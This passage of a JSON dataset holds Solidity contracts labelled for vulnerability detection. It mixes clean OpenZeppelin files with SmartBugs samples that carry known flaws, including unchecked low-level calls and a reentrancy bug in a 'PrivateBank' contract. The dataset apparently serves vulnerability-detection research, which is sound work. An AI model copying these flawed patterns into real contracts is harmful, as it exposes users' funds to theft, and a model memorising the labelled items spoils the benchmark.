UNCHECKED_LL_CALLS\n            requests[requestId].requester.call.gas(2300).value(fee)();\n            externalCallFlag = false;\n        }\n\n        uint callbackGas = (fee - MIN_FEE) / tx.gasprice; // gas left for the callback function\n        DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData); // log the response information\n        if (callbackGas > msg.gas - 5000) {\n            callbackGas = msg.gas - 5000;\n        }\n        \n        externalCallFlag = true;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData); // call the callback function in the application contract\n        externalCallFlag = false;\n    }\n\n    function cancel(uint64 requestId) public returns (int) {\n        if (externalCallFlag) {\n            throw;\n        }\n\n        if (killswitch) {\n            return 0;\n        }\n\n        uint fee = requests[requestId].fee;\n        if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {\n            // If the request was sent by this user and has money left on it,\n            // then cancel it.\n            requests[requestId].fee = CANCELLED_FEE_FLAG;\n            externalCallFlag = true;\n            if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);\n            return SUCCESS_FLAG;\n        } else {\n            Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1);\n            return FAIL_FLAG;\n        }\n    }\n}",
    "num_lines": 222,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "IERC1820Registry",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/interfaces/IERC1820Registry.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (interfaces/IERC1820Registry.sol)\n\npragma solidity >=0.5.0;\n\n/**\n * @dev Interface of the global ERC-1820 Registry, as defined in the\n * https://eips.ethereum.org/EIPS/eip-1820[ERC]. Accounts may register\n * implementers for interfaces in this registry, as well as query support.\n *\n * Implementers may be shared by multiple accounts, and can also implement more\n * than a single interface for each account. Contracts can implement interfaces\n * for themselves, but externally-owned accounts (EOA) must delegate this to a\n * contract.\n *\n * {IERC165} interfaces can also be queried via the registry.\n *\n * For an in-depth explanation and source code analysis, see the ERC text.\n */\ninterface IERC1820Registry {\n    event InterfaceImplementerSet(address indexed account, bytes32 indexed interfaceHash, address indexed implementer);\n\n    event ManagerChanged(address indexed account, address indexed newManager);\n\n    /**\n     * @dev Sets `newManager` as the manager for `account`. A manager of an\n     * account is able to set interface implementers for it.\n     *\n     * By default, each account is its own manager. Passing a value of `0x0` in\n     * `newManager` will reset the manager to this initial state.\n     *\n     * Emits a {ManagerChanged} event.\n     *\n     * Requirements:\n     *\n     * - the caller must be the current manager for `account`.\n     */\n    function setManager(address account, address newManager) external;\n\n    /**\n     * @dev Returns the manager for `account`.\n     *\n     * See {setManager}.\n     */\n    function getManager(address account) external view returns (address);\n\n    /**\n     * @dev Sets the `implementer` contract as ``account``'s implementer for\n     * `interfaceHash`.\n     *\n     * `account` being the zero address is an alias for the caller's address.\n     * The zero address can also be used in `implementer` to remove an old one.\n     *\n     * See {interfaceHash} to learn how these are created.\n     *\n     * Emits an {InterfaceImplementerSet} event.\n     *\n     * Requirements:\n     *\n     * - the caller must be the current manager for `account`.\n     * - `interfaceHash` must not be an {IERC165} interface id (i.e. it must not\n     * end in 28 zeroes).\n     * - `implementer` must implement {IERC1820Implementer} and return true when\n     * queried for support, unless `implementer` is the caller. See\n     * {IERC1820Implementer-canImplementInterfaceForAddress}.\n     */\n    function setInterfaceImplementer(address account, bytes32 _interfaceHash, address implementer) external;\n\n    /**\n     * @dev Returns the implementer of `interfaceHash` for `account`. If no such\n     * implementer is registered, returns the zero address.\n     *\n     * If `interfaceHash` is an {IERC165} interface id (i.e. it ends with 28\n     * zeroes), `account` will be queried for support of it.\n     *\n     * `account` being the zero address is an alias for the caller's address.\n     */\n    function getInterfaceImplementer(address account, bytes32 _interfaceHash) external view returns (address);\n\n    /**\n     * @dev Returns the interface hash for an `interfaceName`, as defined in the\n     * corresponding\n     * https://eips.ethereum.org/EIPS/eip-1820#interface-name[section of the ERC].\n     */\n    function interfaceHash(string calldata interfaceName) external pure returns (bytes32);\n\n    /**\n     * @notice Updates the cache with whether the contract implements an ERC-165 interface or not.\n     * @param account Address of the contract for which to update the cache.\n     * @param interfaceId ERC-165 interface for which to update the cache.\n     */\n    function updateERC165Cache(address account, bytes4 interfaceId) external;\n\n    /**\n     * @notice Checks whether a contract implements an ERC-165 interface or not.\n     * If the result is not cached a direct lookup on the contract address is performed.\n     * If the result is not cached or the cached value is out-of-date, the cache MUST be updated manually by calling\n     * {updateERC165Cache} with the contract address.\n     * @param account Address of the contract to check.\n     * @param interfaceId ERC-165 interface to check.\n     * @return True if `account` implements `interfaceId`, false otherwise.\n     */\n    function implementsERC165Interface(address account, bytes4 interfaceId) external view returns (bool);\n\n    /**\n     * @notice Checks whether a contract implements an ERC-165 interface or not without using or updating the cache.\n     * @param account Address of the contract to check.\n     * @param interfaceId ERC-165 interface to check.\n     * @return True if `account` implements `interfaceId`, false otherwise.\n     */\n    function implementsERC165InterfaceNoCache(address account, bytes4 interfaceId) external view returns (bool);\n}\n",
    "num_lines": 113,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x4051334adc52057aca763453820cb0e045076ef3",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x4051334adc52057aca763453820cb0e045076ef3.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract airdrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n             // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "num_lines": 20,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "MultiSignerERC7913Weighted",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/cryptography/signers/MultiSignerERC7913Weighted.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/cryptography/signers/MultiSignerERC7913Weighted.sol)\n\npragma solidity ^0.8.26;\n\nimport {SafeCast} from \"../../math/SafeCast.sol\";\nimport {MultiSignerERC7913} from \"./MultiSignerERC7913.sol\";\n\n/**\n * @dev Extension of {MultiSignerERC7913} that supports weighted signatures.\n *\n * This contract allows assigning different weights to each signer, enabling more\n * flexible governance schemes. For example, some signers could have higher weight\n * than others, allowing for weighted voting or prioritized authorization.\n *\n * Example of usage:\n *\n * ```solidity\n * contract MyWeightedMultiSignerAccount is Account, MultiSignerERC7913Weighted, Initializable {\n *     function initialize(bytes[] memory signers, uint64[] memory weights, uint64 threshold) public initializer {\n *         _addSigners(signers);\n *         _setSignerWeights(signers, weights);\n *         _setThreshold(threshold);\n *     }\n *\n *     function addSigners(bytes[] memory signers) public onlyEntryPointOrSelf {\n *         _addSigners(signers);\n *     }\n *\n *     function removeSigners(bytes[] memory signers) public onlyEntryPointOrSelf {\n *         _removeSigners(signers);\n *     }\n *\n *     function setThreshold(uint64 threshold) public onlyEntryPointOrSelf {\n *         _setThreshold(threshold);\n *     }\n *\n *     function setSignerWeights(bytes[] memory signers, uint64[] memory weights) public onlyEntryPointOrSelf {\n *         _setSignerWeights(signers, weights);\n *     }\n * }\n * ```\n *\n * IMPORTANT: When setting a threshold value, ensure it matches the scale used for signer weights.\n * For example, if signers have weights like 1, 2, or 3, then a threshold of 4 would require at\n * least two signers (e.g., one with weight 1 and one with weight 3). See {signerWeight}.\n */\nabstract contract MultiSignerERC7913Weighted is MultiSignerERC7913 {\n    using SafeCast for *;\n\n    // Sum of all the extra weights of all signers. Storage packed with `MultiSignerERC7913._threshold`\n    uint64 private _totalExtraWeight;\n\n    // Mapping from signer to extraWeight (in addition to all authorized signers having weight 1)\n    mapping(bytes signer => uint64) private _extraWeights;\n\n    /**\n     * @dev Emitted when a signer's weight is changed.\n     *\n     * NOTE: Not emitted in {_addSigners} or {_removeSigners}. Indexers must rely on {ERC7913SignerAdded}\n     * and {ERC7913SignerRemoved} to index a default weight of 1. See {signerWeight}.\n     */\n    event ERC7913SignerWeightChanged(bytes indexed signer, uint64 weight);\n\n    /// @dev Thrown when a signer's weight is invalid.\n    error MultiSignerERC7913WeightedInvalidWeight(bytes signer, uint64 weight);\n\n    /// @dev Thrown when the arrays lengths don't match. See {_setSignerWeights}.\n    error MultiSignerERC7913WeightedMismatchedLength();\n\n    constructor(bytes[] memory signers_, uint64[] memory weights_, uint64 threshold_) MultiSignerERC7913(signers_, 1) {\n        _setSignerWeights(signers_, weights_);\n        _setThreshold(threshold_);\n    }\n\n    /// @dev Gets the weight of a signer. Returns 0 if the signer is not authorized.\n    function signerWeight(bytes memory signer) public view virtual returns (uint64) {\n        unchecked {\n            // Safe cast, _setSignerWeights guarantees 1+_extraWeights is a uint64\n            return uint64(isSigner(signer).toUint() * (1 + _extraWeights[signer]));\n        }\n    }\n\n    /// @dev Gets the total weight of all signers.\n    function totalWeight() public view virtual returns (uint64) {\n        return (getSignerCount() + _totalExtraWeight).toUint64();\n    }\n\n    /**\n     * @dev Sets weights for multiple signers at once. Internal version without access control.\n     *\n     * Requirements:\n     *\n     * * `signers` and `weights` arrays must have the same length. Reverts with {MultiSignerERC7913WeightedMismatchedLength} on mismatch.\n     * * Each signer must exist in the set of authorized signers. Otherwise reverts with {MultiSignerERC7913NonexistentSigner}\n     * * Each weight must be greater than 0. Otherwise reverts with {MultiSignerERC7913WeightedInvalidWeight}\n     * * See {_validateReachableThreshold} for the threshold validation.\n     *\n     * Emits {ERC7913SignerWeightChanged} for each signer.\n     */\n    function _setSignerWeights(bytes[] memory signers, uint64[] memory weights) internal virtual {\n        require(signers.length == weights.length, MultiSignerERC7913WeightedMismatchedLength());\n\n        uint256 extraWeightAdded = 0;\n        uint256 extraWeightRemoved = 0;\n        for (uint256 i = 0; i < signers.length; ++i) {\n            bytes memory signer = signers[i];\n            require(isSigner(signer), MultiSignerERC7913NonexistentSigner(signer));\n\n            uint64 weight = weights[i];\n            require(weight > 0, MultiSignerERC7913WeightedInvalidWeight(signer, weight));\n\n            unchecked {\n                uint64 oldExtraWeight = _extraWeights[signer];\n                uint64 newExtraWeight = weight - 1;\n\n                if (oldExtraWeight != newExtraWeight) {\n                    // Overflow impossible: weight values are bounded by uint64 and economic constraints\n                    extraWeightRemoved += oldExtraWeight;\n                    extraWeightAdded += _extraWeights[signer] = newExtraWeight;\n                    emit ERC7913SignerWeightChanged(signer, weight);\n                }\n            }\n        }\n        unchecked {\n            // Safe from underflow: `extraWeightRemoved` is bounded by `_totalExtraWeight` by construction\n            // and weight values are bounded by uint64 and economic constraints\n            _totalExtraWeight = (uint256(_totalExtraWeight) + extraWeightAdded - extraWeightRemoved).toUint64();\n        }\n        _validateReachableThreshold();\n    }\n\n    /**\n     * @dev See {MultiSignerERC7913-_addSigners}.\n     *\n     * In cases where {totalWeight} is almost `type(uint64).max` (due to a large `_totalExtraWeight`), adding new\n     * signers could cause the {totalWeight} computation to overflow. Adding a {totalWeight} calls after the new\n     * signers are added ensures no such overflow happens.\n     */\n    function _addSigners(bytes[] memory newSigners) internal virtual override {\n        super._addSigners(newSigners);\n\n        // This will revert if the new signers cause an overflow\n        _validateReachableThreshold();\n    }\n\n    /**\n     * @dev See {MultiSignerERC7913-_removeSigners}.\n     *\n     * Just like {_addSigners}, this function does not emit {ERC7913SignerWeightChanged} events. The\n     * {ERC7913SignerRemoved} event emitted by {MultiSignerERC7913-_removeSigners} is enough to track weights here.\n     */\n    function _removeSigners(bytes[] memory signers) internal virtual override {\n        // Clean up weights for removed signers\n        //\n        // The `extraWeightRemoved` is bounded by `_totalExtraWeight`. The `super._removeSigners` function will revert\n        // if the signers array contains any duplicates, ensuring each signer's weight is only counted once. Since\n        // `_totalExtraWeight` is stored as a `uint64`, the final subtraction operation is also safe.\n        unchecked {\n            uint64 extraWeightRemoved = 0;\n            for (uint256 i = 0; i < signers.length; ++i) {\n                bytes memory signer = signers[i];\n\n                extraWeightRemoved += _extraWeights[signer];\n                delete _extraWeights[signer];\n            }\n            _totalExtraWeight -= extraWeightRemoved;\n        }\n        super._removeSigners(signers);\n    }\n\n    /**\n     * @dev Sets the threshold for the multisignature operation. Internal version without access control.\n     *\n     * Requirements:\n     *\n     * * The {totalWeight} must be `>=` the {threshold}. Otherwise reverts with {MultiSignerERC7913UnreachableThreshold}\n     *\n     * NOTE: This function intentionally does not call `super._validateReachableThreshold` because the base implementation\n     * assumes each signer has a weight of 1, which is a subset of this weighted implementation. Consider that multiple\n     * implementations of this function may exist in the contract, so important side effects may be missed\n     * depending on the linearization order.\n     */\n    function _validateReachableThreshold() internal view virtual override {\n        uint64 weight = totalWeight();\n        uint64 currentThreshold = threshold();\n        require(weight >= currentThreshold, MultiSignerERC7913UnreachableThreshold(weight, currentThreshold));\n    }\n\n    /**\n     * @dev Validates that the total weight of signers meets the threshold requirement.\n     *\n     * NOTE: This function intentionally does not call `super._validateThreshold` because the base implementation\n     * assumes each signer has a weight of 1, which is a subset of this weighted implementation. Consider that multiple\n     * implementations of this function may exist in the contract, so important side effects may be missed\n     * depending on the linearization order.\n     */\n    function _validateThreshold(bytes[] memory signers) internal view virtual override returns (bool) {\n        unchecked {\n            uint64 weight = 0;\n            for (uint256 i = 0; i < signers.length; ++i) {\n                // Overflow impossible: weight values are bounded by uint64 and economic constraints\n                weight += signerWeight(signers[i]);\n            }\n            return weight >= threshold();\n        }\n    }\n}\n",
    "num_lines": 209,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _lib)\n    {\n        TransferLog = Log(_lib);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 74,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC2771Context",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/metatx/ERC2771Context.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (metatx/ERC2771Context.sol)\n\npragma solidity ^0.8.20;\n\nimport {Context} from \"../utils/Context.sol\";\n\n/**\n * @dev Context variant with ERC-2771 support. See {_msgSender} for the calldata format.\n *\n * WARNING: Avoid using this pattern in contracts that rely on a specific calldata length as they'll\n * be affected by any forwarder whose `msg.data` is suffixed with the `from` address according to the ERC-2771\n * specification adding the address size in bytes (20) to the calldata size. An example of an unexpected\n * behavior could be an unintended fallback (or another function) invocation while trying to invoke the `receive`\n * function only accessible if `msg.data.length == 0`.\n *\n * WARNING: The usage of `delegatecall` in this contract is dangerous and may result in context corruption.\n * Any forwarded request to this contract triggering a `delegatecall` to itself will result in an invalid {_msgSender}\n * recovery.\n */\nabstract contract ERC2771Context is Context {\n    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable\n    address private immutable _trustedForwarder;\n\n    /**\n     * @dev Initializes the contract with a trusted forwarder, which will be able to\n     * invoke functions on this contract on behalf of other accounts.\n     *\n     * NOTE: The trusted forwarder can be replaced by overriding {trustedForwarder}.\n     */\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor(address trustedForwarder_) {\n        _trustedForwarder = trustedForwarder_;\n    }\n\n    /**\n     * @dev Returns the address of the trusted forwarder.\n     */\n    function trustedForwarder() public view virtual returns (address) {\n        return _trustedForwarder;\n    }\n\n    /**\n     * @dev Indicates whether any particular address is the trusted forwarder.\n     */\n    function isTrustedForwarder(address forwarder) public view virtual returns (bool) {\n        return forwarder == trustedForwarder();\n    }\n\n    /**\n     * @dev Override for `msg.sender`. Defaults to the original `msg.sender` whenever\n     * a call is not performed by the trusted forwarder or the calldata length is less than\n     * 20 bytes (an address length).\n     */\n    function _msgSender() internal view virtual override returns (address) {\n        uint256 calldataLength = msg.data.length;\n        uint256 contextSuffixLength = _contextSuffixLength();\n        if (calldataLength >= contextSuffixLength && isTrustedForwarder(msg.sender)) {\n            unchecked {\n                return address(bytes20(msg.data[calldataLength - contextSuffixLength:]));\n            }\n        } else {\n            return super._msgSender();\n        }\n    }\n\n    /**\n     * @dev Override for `msg.data`. Defaults to the original `msg.data` whenever\n     * a call is not performed by the trusted forwarder or the calldata length is less than\n     * 20 bytes (an address length).\n     */\n    function _msgData() internal view virtual override returns (bytes calldata) {\n        uint256 calldataLength = msg.data.length;\n        uint256 contextSuffixLength = _contextSuffixLength();\n        if (calldataLength >= contextSuffixLength && isTrustedForwarder(msg.sender)) {\n            unchecked {\n                return msg.data[:calldataLength - contextSuffixLength];\n            }\n        } else {\n            return super._msgData();\n        }\n    }\n\n    /**\n     * @dev ERC-2771 specifies the context as being a single address (20 bytes).\n     */\n    function _contextSuffixLength() internal view virtual override returns (uint256) {\n        return 20;\n    }\n}\n",
    "num_lines": 91,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "IERC777Sender",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/interfaces/IERC777Sender.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (interfaces/IERC777Sender.sol)\n\npragma solidity >=0.5.0;\n\n/**\n * @dev Interface of the ERC-777 Tokens Sender standard as defined in the ERC.\n *\n * {IERC777} Token holders can be notified of operations performed on their\n * tokens by having a contract implement this interface (contract holders can be\n * their own implementer) and registering it on the\n * https://eips.ethereum.org/EIPS/eip-1820[ERC-1820 global registry].\n *\n * See {IERC1820Registry} and {IERC1820Implementer}.\n */\ninterface IERC777Sender {\n    /**\n     * @dev Called by an {IERC777} token contract whenever a registered holder's\n     * (`from`) tokens are about to be moved or destroyed. The type of operation\n     * is conveyed by `to` being the zero address or not.\n     *\n     * This call occurs _before_ the token contract's state is updated, so\n     * {IERC777-balanceOf}, etc., can be used to query the pre-operation state.\n     *\n     * This function may revert to prevent the operation from being executed.\n     */\n    function tokensToSend(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata userData,\n        bytes calldata operatorData\n    ) external;\n}\n",
    "num_lines": 36,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "ERC2771Forwarder",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/metatx/ERC2771Forwarder.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (metatx/ERC2771Forwarder.sol)\n\npragma solidity ^0.8.24;\n\nimport {ERC2771Context} from \"./ERC2771Context.sol\";\nimport {ECDSA} from \"../utils/cryptography/ECDSA.sol\";\nimport {EIP712} from \"../utils/cryptography/EIP712.sol\";\nimport {Nonces} from \"../utils/Nonces.sol\";\nimport {Address} from \"../utils/Address.sol\";\nimport {Errors} from \"../utils/Errors.sol\";\n\n/**\n * @dev A forwarder compatible with ERC-2771 contracts. See {ERC2771Context}.\n *\n * This forwarder operates on forward requests that include:\n *\n * * `from`: An address to operate on behalf of. It is required to be equal to the request signer.\n * * `to`: The address that should be called.\n * * `value`: The amount of native token to attach with the requested call.\n * * `gas`: The amount of gas limit that will be forwarded with the requested call.\n * * `nonce` (implicit): Taken from {Nonces} for `from` and included in the signed typed data.\n * * `deadline`: A timestamp after which the request is not executable anymore.\n * * `data`: Encoded `msg.data` to send with the requested call.\n *\n * Relayers are able to submit batches if they are processing a high volume of requests. With high\n * throughput, relayers may run into limitations of the chain such as limits on the number of\n * transactions in the mempool. In these cases the recommendation is to distribute the load among\n * multiple accounts.\n *\n * NOTE: Batching requests includes an optional refund for unused `msg.value` that is achieved by\n * performing a call with empty calldata. While this is within the bounds of ERC-2771 compliance,\n * if the refund receiver happens to consider the forwarder a trusted forwarder, it MUST properly\n * handle `msg.data.length == 0`. `ERC2771Context` in OpenZeppelin Contracts versions prior to 4.9.3\n * do not handle this properly.\n *\n * ==== Security Considerations\n *\n * If a relayer submits a forward request, it should be willing to pay up to 100% of the gas amount\n * specified in the request. This contract does not implement any kind of retribution for this gas,\n * and it is assumed that there is an out of band incentive for relayers to pay for execution on\n * behalf of signers. Often, the relayer is operated by a project that will consider it a user\n * acquisition cost.\n *\n * By offering to pay for gas, relayers are at risk of having that gas used by an attacker toward\n * some other purpose that is not aligned with the expected out of band incentives. If you operate a\n * relayer, consider whitelisting target contracts and function selectors. When relaying ERC-721 or\n * ERC-1155 transfers specifically, consider rejecting the use of the `data` field, since it can be\n * used to execute arbitrary code.\n */\ncontract ERC2771Forwarder is EIP712, Nonces {\n    using ECDSA for bytes32;\n\n    struct ForwardRequestData {\n        address from;\n        address to;\n        uint256 value;\n        uint256 gas;\n        uint48 deadline;\n        bytes data;\n        bytes signature;\n    }\n\n    bytes32 internal constant FORWARD_REQUEST_TYPEHASH =\n        keccak256(\n            \"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)\"\n        );\n\n    /**\n     * @dev Emitted when a `ForwardRequest` is executed.\n     *\n     * NOTE: An unsuccessful forward request could be due to an invalid signature, an expired deadline,\n     * or simply a revert in the requested call. The contract guarantees that the relayer is not able to force\n     * the requested call to run out of gas.\n     */\n    event ExecutedForwardRequest(address indexed signer, uint256 nonce, bool success);\n\n    /**\n     * @dev The request `from` doesn't match with the recovered `signer`.\n     */\n    error ERC2771ForwarderInvalidSigner(address signer, address from);\n\n    /**\n     * @dev The `requestedValue` doesn't match with the available `msgValue`.\n     */\n    error ERC2771ForwarderMismatchedValue(uint256 requestedValue, uint256 msgValue);\n\n    /**\n     * @dev The request `deadline` has expired.\n     */\n    error ERC2771ForwarderExpiredRequest(uint48 deadline);\n\n    /**\n     * @dev The request target doesn't trust the `forwarder`.\n     */\n    error ERC2771UntrustfulTarget(address target, address forwarder);\n\n    /**\n     * @dev See {EIP712-constructor}.\n     */\n    constructor(string memory name) EIP712(name, \"1\") {}\n\n    /**\n     * @dev Returns `true` if a request is valid for a provided `signature` at the current block timestamp.\n     *\n     * A transaction is considered valid when the target trusts this forwarder, the request hasn't expired\n     * (deadline is not met), and the signer matches the `from` parameter of the signed request.\n     *\n     * NOTE: A request may return false here but it won't cause {executeBatch} to revert if a refund\n     * receiver is provided.\n     */\n    function verify(ForwardRequestData calldata request) public view virtual returns (bool) {\n        (bool isTrustedForwarder, bool active, bool signerMatch, ) = _validate(request);\n        return isTrustedForwarder && active && signerMatch;\n    }\n\n    /**\n     * @dev Executes a `request` on behalf of `signature`'s signer using the ERC-2771 protocol. The gas\n     * provided to the requested call may not be exactly the amount requested, but the call will not run\n     * out of gas. Will revert if the request is invalid or the call reverts, in this case the nonce is not consumed.\n     *\n     * Requirements:\n     *\n     * - The request value should be equal to the provided `msg.value`.\n     * - The request should be valid according to {verify}.\n     */\n    function execute(ForwardRequestData calldata request) public payable virtual {\n        // We make sure that msg.value and request.value match exactly.\n        // If the request is invalid or the call reverts, this whole function\n        // will revert, ensuring value isn't stuck.\n        if (msg.value != request.value) {\n            revert ERC2771ForwarderMismatchedValue(request.value, msg.value);\n        }\n\n        if (!_execute(request, true)) {\n            revert Errors.FailedCall();\n        }\n    }\n\n    /**\n     * @dev Batch version of {execute} with optional refunding and atomic execution.\n     *\n     * In case a batch contains at least one invalid request (see {verify}), the\n     * request will be skipped and the `refundReceiver` parameter will receive back the\n     * unused requested value at the end of the execution. This is done to prevent reverting\n     * the entire batch when a request is invalid or has already been submitted.\n     *\n     * If the `refundReceiver` is the `address(0)`, this function will revert when at least\n     * one of the requests was not valid instead of skipping it. This could be useful if\n     * a batch is required to get executed atomically (at least at the top-level). For example,\n     * refunding (and thus atomicity) can be opt-out if the relayer is using a service that avoids\n     * including reverted transactions.\n     *\n     * Requirements:\n     *\n     * - The sum of the requests' values should be equal to the provided `msg.value`.\n     * - All of the requests should be valid (see {verify}) when `refundReceiver` is the zero address.\n     *\n     * NOTE: Setting a zero `refundReceiver` guarantees an all-or-nothing requests execution only for\n     * the first-level forwarded calls. In case a forwarded request calls to a contract with another\n     * subcall, the second-level call may revert without the top-level call reverting.\n     */\n    function executeBatch(\n        ForwardRequestData[] calldata requests,\n        address payable refundReceiver\n    ) public payable virtual {\n        bool atomic = refundReceiver == address(0);\n\n        uint256 requestsValue;\n        uint256 refundValue;\n\n        for (uint256 i; i < requests.length; ++i) {\n            requestsValue += requests[i].value;\n            bool success = _execute(requests[i], atomic);\n            if (!success) {\n                refundValue += requests[i].value;\n            }\n        }\n\n        // The batch should revert if there's a mismatched msg.value provided\n        // to avoid request value tampering\n        if (requestsValue != msg.value) {\n            revert ERC2771ForwarderMismatchedValue(requestsValue, msg.value);\n        }\n\n        // Some requests with value were invalid (possibly due to frontrunning).\n        // To avoid leaving ETH in the contract this value is refunded.\n        if (refundValue != 0) {\n            // We know refundReceiver != address(0) && requestsValue == msg.value\n            // meaning we can ensure refundValue is not taken from the original contract's balance\n            // and refundReceiver is a known account.\n            Address.sendValue(refundReceiver, refundValue);\n        }\n    }\n\n    /**\n     * @dev Validates if the provided request can be executed at current block timestamp with\n     * the given `request.signature` on behalf of `request.from`.\n     */\n    function _validate(\n        ForwardRequestData calldata request\n    ) internal view virtual returns (bool isTrustedForwarder, bool active, bool signerMatch, address signer) {\n        (bool isValid, address recovered) = _recoverForwardRequestSigner(request);\n\n        return (\n            _isTrustedByTarget(request.to),\n            request.deadline >= block.timestamp,\n            isValid && recovered == request.from,\n            recovered\n        );\n    }\n\n    /**\n     * @dev Returns a tuple with the recovered the signer of an EIP712 forward request message hash\n     * and a boolean indicating if the signature is valid.\n     *\n     * NOTE: The signature is considered valid if {ECDSA-tryRecover} indicates no recover error for it.\n     */\n    function _recoverForwardRequestSigner(\n        ForwardRequestData calldata request\n    ) internal view virtual returns (bool isValid, address signer) {\n        (address recovered, ECDSA.RecoverError err, ) = _hashTypedDataV4(\n            keccak256(\n                abi.encode(\n                    FORWARD_REQUEST_TYPEHASH,\n                    request.from,\n                    request.to,\n                    request.value,\n                    request.gas,\n                    nonces(request.from),\n                    request.deadline,\n                    keccak256(request.data)\n                )\n            )\n        ).tryRecoverCalldata(request.signature);\n\n        return (err == ECDSA.RecoverError.NoError, recovered);\n    }\n\n    /**\n     * @dev Validates and executes a signed request returning the request call `success` value.\n     *\n     * Internal function without msg.value validation.\n     *\n     * Requirements:\n     *\n     * - The caller must have provided enough gas to forward with the call.\n     * - The request must be valid (see {verify}) if the `requireValidRequest` is true.\n     *\n     * Emits an {ExecutedForwardRequest} event.\n     *\n     * IMPORTANT: Using this function doesn't check that all the `msg.value` was sent, potentially\n     * leaving value stuck in the contract.\n     */\n    function _execute(\n        ForwardRequestData calldata request,\n        bool requireValidRequest\n    ) internal virtual returns (bool success) {\n        (bool isTrustedForwarder, bool active, bool signerMatch, address signer) = _validate(request);\n\n        // Need to explicitly specify if a revert is required since non-reverting is default for\n        // batches and reversion is opt-in since it could be useful in some scenarios\n        if (requireValidRequest) {\n            if (!isTrustedForwarder) {\n                revert ERC2771UntrustfulTarget(request.to, address(this));\n            }\n\n            if (!active) {\n                revert ERC2771ForwarderExpiredRequest(request.deadline);\n            }\n\n            if (!signerMatch) {\n                revert ERC2771ForwarderInvalidSigner(signer, request.from);\n            }\n        }\n\n        // Ignore an invalid request because requireValidRequest = false\n        if (isTrustedForwarder && signerMatch && active) {\n            // Nonce should be used before the call to prevent reusing by reentrancy\n            uint256 currentNonce = _useNonce(signer);\n\n            uint256 reqGas = request.gas;\n            address to = request.to;\n            uint256 value = request.value;\n            bytes memory data = 